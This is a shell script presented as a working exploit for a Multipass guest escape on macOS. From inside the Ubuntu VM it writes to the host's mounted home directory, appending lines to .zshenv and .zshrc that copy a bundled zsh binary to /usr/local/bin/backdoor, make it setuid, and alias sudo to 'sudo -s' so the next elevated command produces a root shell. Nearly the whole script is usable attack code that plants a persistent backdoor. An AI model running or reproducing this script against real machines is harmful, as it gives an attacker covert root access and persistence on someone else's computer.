clear
echo "***************************************"
echo "Tested on 12.1. Monterey ARM64/X86_64  "
echo "          zsh macos backdoor           "
echo "***************************************"

# It seems that the GUI "primary" instance VM Ubuntu 20.04
# of Multipass 1.8.1+mac contains a default enabled  
# mount of host's home directory in /home/ubuntu/Home 
# This can be abused as a simple guest escape 
# Modification of host's OS user zsh profiles to include 
# malicious commands. 

# Interesting privilege escalation exists on the 
# current MacOS Monterey and BigSur (that use zsh) 
# 
# Exploit works on the default zsh environment 
# of MacOS + multipass how it automounts $user 
# $home directory 
# We are taking an advantage of the Multipass's 
# creation of /usr/local/bin so we can hide our 
# backdoor there.
# It is not possible to use a copy of the Host's /bin/zsh 
# directly in /usr/local/bin  
# cp /bin/zsh ./shell 
# ./shell 
# zsh: exec format error: ./shell 
# So in this exploit we are using a copied zsh executable 
# from a MacOS Monterey VM which does not have such restrictions 
# the executable is included with the exploit as shell 

# Lets do some checks if the host OS is a MacOS 

# Checking if we have .zshenv 
if [[ -f $HOME/.zshenv ]] 
then 
	echo "[+] .zshenv exists on your host OS. "
        echo "    Patching .zshenv with payload " 
        echo 'cp .shell /usr/local/bin/backdoor > /dev/null 2>&1' >> $HOME/.zshenv 
        echo 'chmod +s /usr/local/bin/backdoor > /dev/null 2>&1' >> $HOME/.zshenv 
        echo 'alias sudo="sudo -s"' >> $HOME/.zshrc
        echo 'Copying shell binary to the host filesystem' 
	cp ./shell $HOME/.shell
        echo ""
	echo "Now let the user run some elevated command via sudo on the MacOS "
	echo "A setuid 0 shell is available in /usr/local/bin/backdoor " 

else   
       	echo "[-] .zshenv does not exist !"
        echo "Creating one " 
	echo 'cp .shell /usr/local/bin/backdoor > /dev/null 2>&1' >> $HOME/.zshenv
        echo 'chmod +s /usr/local/bin/backdoor > /dev/null 2>&1' >> $HOME/.zshenv
        echo 'alias sudo="sudo -s"' >> $HOME/.zshrc
        cp ./shell /home/ubuntu/Home/.shell
        echo "" 
	echo "Now let the user run some elevated command via sudo on the MacOS "
        echo "A setuid 0 shell is available in /usr/local/bin/backdoor "
fi

exit 0 
